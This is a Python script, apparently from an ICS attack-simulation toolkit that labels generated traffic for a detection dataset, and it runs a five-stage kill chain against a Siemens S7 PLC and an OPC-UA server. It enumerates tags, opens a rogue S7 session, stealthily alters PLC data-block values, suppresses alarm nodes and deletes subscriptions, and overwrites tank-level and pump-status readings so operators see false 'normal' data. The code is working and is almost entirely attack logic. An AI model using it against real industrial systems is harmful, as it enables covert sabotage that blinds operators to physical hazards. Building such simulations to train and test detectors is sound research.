"""
FULL_KILL_CHAIN
Multi-stage attack giả lập APT tấn công ICS:
  Stage 1: Reconnaissance  - ENUM_OPC
  Stage 2: Initial Access  - ROGUE_EWS_S7
  Stage 3: Execution       - COVERT_WRITE_PLC
  Stage 4: Impact          - ALARM_SUPPRESS_OPC
  Stage 5: Cover           - FAKE_DISPLAY_OPC

Gọi từ bash:
  python -m attacks_ext.kill_chain \
      --target 192.168.1.10 --rack 0 --slot 1 \
      --opc-url opc.tcp://192.168.1.20:4840 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
from attacks_ext.config_ext import base_parser, write_label

STAGES = {
    1: "RECON_OPC_ENUM",
    2: "INITIAL_ACCESS_ROGUE_EWS",
    3: "EXECUTION_COVERT_WRITE",
    4: "IMPACT_ALARM_SUPPRESS",
    5: "COVER_FAKE_DISPLAY",
}


def log_stage(stage_num, msg):
    print(f"\n{'='*60}")
    print(f"[STAGE {stage_num}] {STAGES[stage_num]}")
    print(f"[INFO]  {msg}")
    print(f"{'='*60}")


def stage1_recon(opc_client):
    log_stage(1, "Quét OPC-UA namespace để tìm tag và cấu trúc hệ thống")
    discovered = []
    try:
        objects = opc_client.get_objects_node()
        for child in objects.get_children():
            try:
                name = child.get_browse_name().Name
                print(f"  [ENUM] Found: {name} ({child.nodeid})")
                discovered.append(str(child.nodeid))
                for subchild in child.get_children():
                    subname = subchild.get_browse_name().Name
                    print(f"    [ENUM]   L- {subname} ({subchild.nodeid})")
                    discovered.append(str(subchild.nodeid))
            except Exception:
                pass
        print(f"\n  [RESULT] Tìm thấy {len(discovered)} nodes")
    except Exception as e:
        print(f"  [ERR] {e}")
    return discovered


def stage2_rogue_access(plc, target, rack, slot):
    log_stage(2, "Kết nối S7 từ IP attacker, đọc thông tin PLC")
    try:
        import snap7
        plc.connect(target, rack, slot)
        print(f"  [+] Kết nối S7 thành công từ IP attacker")
        info = plc.get_cpu_info()
        print(f"  [INFO] PLC Module: {info.ModuleTypeName.decode()}")
        print(f"  [INFO] Serial: {info.SerialNumber.decode()}")
        for db_num in [1, 2, 3]:
            try:
                data = plc.db_read(db_num, 0, 50)
                print(f"  [READ] DB{db_num}: {data[:8].hex()}...")
                time.sleep(1)
            except Exception:
                pass
        print(f"  [*] Rogue session thiết lập thành công")
    except Exception as e:
        print(f"  [ERR] {e}")


def stage3_covert_write(plc):
    log_stage(3, "Ghi giá trị sai vào PLC nhưng trong ngưỡng bình thường (stealthy)")
    try:
        current = plc.db_read(1, 0, 10)
        print(f"  [READ] DB1 hiện tại: {current[:10].hex()}")
        modified = bytearray(current)
        original_byte = modified[2]
        modified[2] = min(original_byte + 3, 255)
        plc.db_write(1, 0, bytes(modified[:10]))
        print(f"  [WRITE] DB1 byte[2]: {original_byte} -> {modified[2]} (delta=+3, stealthy)")
        for i in range(3):
            time.sleep(4)
            modified[2] = min(modified[2] + 1, 255)
            plc.db_write(1, 0, bytes(modified[:10]))
            print(f"  [WRITE] Iteration {i+1}: byte[2] = {modified[2]}")
        print(f"  [*] Covert write hoàn tất")
    except Exception as e:
        print(f"  [ERR] {e}")


def stage4_alarm_suppress(opc_client):
    log_stage(4, "Xóa OPC-UA subscription để tắt cảnh báo trên HMI")
    try:
        sub = opc_client.create_subscription(500, handler=None)
        print(f"  [SUB] Tạo subscription ID: {sub.subscription_id}")
        time.sleep(2)
        sub.delete()
        print(f"  [DELETE] Đã xóa subscription - HMI mù cảnh báo!")
        alarm_nodes = [
            "ns=2;s=PLC.Alarms.HighLevel",
            "ns=2;s=PLC.Alarms.LowPressure",
        ]
        for node_id in alarm_nodes:
            try:
                node = opc_client.get_node(node_id)
                node.set_value(False)
                print(f"  [SUPPRESS] {node_id} <- False")
            except Exception as e:
                print(f"  [WARN] {node_id}: {e}")
        time.sleep(5)
    except Exception as e:
        print(f"  [ERR] {e}")


def stage5_fake_display(opc_client):
    log_stage(5, "Ghi đè giá trị hiển thị - operator thấy 'bình thường'")
    fake_values = [
        {"node_id": "ns=2;s=PLC.Tank1.Level",  "fake": 50.0},
        {"node_id": "ns=2;s=PLC.Pump1.Status", "fake": True},
    ]
    try:
        for _ in range(8):
            for item in fake_values:
                node = opc_client.get_node(item["node_id"])
                try:
                    node.set_value(item["fake"])
                    print(f"  [FAKE] {item['node_id']} <- {item['fake']}")
                except Exception as e:
                    print(f"  [WARN] {item['node_id']}: {e}")
            time.sleep(3)
        print(f"  [*] Operator đang nhìn thấy dữ liệu giả!")
    except Exception as e:
        print(f"  [ERR] {e}")


def run(args):
    import snap7
    label_prefix = "KILL_CHAIN"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"target={args.target} opc={args.opc_url}")

    opc = None
    plc = None

    try:
        from opcua import Client as OPCClient

        opc = OPCClient(args.opc_url)
        if hasattr(args, "opc_username") and args.opc_username:
            opc.set_user(args.opc_username)
        if hasattr(args, "opc_password") and args.opc_password:
            opc.set_password(args.opc_password)
        opc.connect()
        print(f"[INIT] OPC-UA connected: {args.opc_url}")

        plc = snap7.client.Client()

        stage1_recon(opc)
        time.sleep(3)
        stage2_rogue_access(plc, args.target, args.rack, args.slot)
        time.sleep(3)
        if plc.get_connected():
            stage3_covert_write(plc)
        time.sleep(3)
        stage4_alarm_suppress(opc)
        time.sleep(3)
        stage5_fake_display(opc)

        print(f"\n[COMPLETE] Kill Chain hoàn tất!")

    except ImportError as e:
        print(f"[ERR] Thiếu thư viện: {e}")
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if plc and plc.get_connected():
            plc.disconnect()
        if opc:
            try:
                opc.disconnect()
            except Exception:
                pass
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day)


def main():
    p = base_parser("Full ICS Kill Chain Simulation")
    p.add_argument("--target", default="192.168.1.10")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    p.add_argument("--opc-url", default="opc.tcp://192.168.1.20:4840")
    p.add_argument("--opc-username", default="admin")
    p.add_argument("--opc-password", default="admin123")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
